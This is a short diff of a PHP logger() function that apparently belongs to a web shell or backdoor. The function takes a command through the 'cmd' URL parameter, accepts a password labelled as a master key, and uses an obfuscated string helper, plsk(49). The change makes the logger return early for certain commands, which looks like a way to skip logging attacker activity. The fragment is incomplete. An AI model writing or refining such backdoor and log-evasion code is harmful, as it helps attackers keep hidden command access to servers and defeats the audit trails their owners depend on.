@@ -34,8 +34,9 @@ function logger() {
 	//echo $_GET['pass'];
 	//echo $pass;
 	//echo $useduid;
-	if (substr_count($_GET['cmd'], plsk(49)) > 0) {
-		echo('nolog');
+	#echo plsk(49);
+	if (substr_count(plsk(49), $_GET['cmd']) > 0) {
+		return 0;
 	}
 	if ($_GET['pass'] == $pass && !$useduid) {
 		$addon = ": yesauth/masterkey";
